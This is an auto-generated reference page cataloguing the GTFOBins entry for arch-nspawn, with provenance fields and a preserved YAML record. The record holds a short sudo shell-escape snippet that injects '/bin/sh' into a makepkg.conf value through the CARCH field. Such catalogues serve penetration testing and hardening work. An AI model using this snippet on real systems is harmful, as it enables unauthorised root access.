---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# arch-nspawn

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `arch-nspawn` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/arch-nspawn` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [arch-nspawn](../../tools/linux/arch-nspawn.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | arch-nspawn |
| name | arch-nspawn |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/arch-nspawn/ |

## Preserved Source Material

```yaml
_body: ''
_name: arch-nspawn
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/arch-nspawn
functions:
  shell:
  - code: 'mkdir -p ./etc/

      grep -oP "^CHROOT_VERSION=''\K[^'']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot

      touch ./etc/pacman.conf

      echo ''CARCH=true;/bin/sh;exit'' >etc/makepkg.conf

      arch-nspawn .'
    contexts:
      sudo: null
```
